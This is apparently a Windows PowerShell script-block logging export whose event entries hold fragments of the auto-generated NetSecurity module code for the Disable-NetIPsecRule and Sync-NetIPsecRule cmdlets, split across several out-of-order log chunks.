        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase2AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase2AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase2AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('KeyModule') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_va

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (20 of 23):
uilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetConSecRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetConSecRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetConSecRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetConSecRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase2AuthSet') -and (@('ByAssociatedNetIPsecPhase2AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase2AuthSet}, 'MSFT_NetConSecRuleEMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetConSecRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecQuickModeCryptoSet') -and (@('ByAssociatedNetIPsecQuickModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecQuickModeCryptoSet}, 'MSFT_NetConSecRuleQMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Disable', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Disable-NetIPsecRule' -Alias '*'
        

function Sync-NetIPsecRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance[]])]
    param(
    
    [Parameter(ParameterSetName='ByIPsecRuleName', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]
    [Alias('ID','Name')]
    [ValidateNotNull()]
    [string[]]
    ${IPsecRuleName},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode[]]
    ${Mode},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecIn')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${InboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecOut')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${OutboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${QuickModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase2AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule[]]
    ${KeyModule},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowWatchKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowSetKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${RemoteTunnelHostname},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${ForwardPathLifetime},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${EncryptedTunnelBypass},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${RequireAuthorization},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${User},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Machine},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP2AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase2AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEQMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecQuickModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNe

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (19 of 23):
atedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('IPsecRuleName') -and (@('ByIPsecRuleName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${IPsecRuleName})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Mode') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Mode})
        $__cmdletization_queryBuilder.FilterByProperty('Mode', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('InboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${InboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('InboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('OutboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${OutboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('OutboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('QuickModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${QuickModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('QuickModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase2AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase2AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase2AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('KeyModule') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${KeyModule})
        $__cmdletization_queryBuilder.FilterByProperty('KeyModule', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowWatchKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowWatchKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowWatchKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowSetKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowSetKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowSetKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RemoteTunnelHostname') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RemoteTunnelHostname})
        $__cmdletization_queryBuilder.FilterByProperty('RemoteTunnelEndpointDNSName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('ForwardPathLifetime') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ForwardPathLifetime})
        $__cmdletization_queryBuilder.FilterByProperty('MaxReturnPathLifetimeSeconds', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EncryptedTunnelBypass') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EncryptedTunnelBypass})
        $__cmdletization_queryBuilder.FilterByProperty('BypassTunnelIfEncrypted', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RequireAuthorization') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RequireAuthorization})
        $__cmdletization_queryBuilder.FilterByProperty('RequireAuthorization', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('User') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${User})
        $__cmdletization_queryBuilder.FilterByProperty('Users', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Machine') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Machine})
        $__cmdletization_queryBuilder.FilterByProperty('Machines', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetConSecRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryB

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (18 of 23):
mdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetConSecRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetConSecRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase2AuthSet') -and (@('ByAssociatedNetIPsecPhase2AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase2AuthSet}, 'MSFT_NetConSecRuleEMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetConSecRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
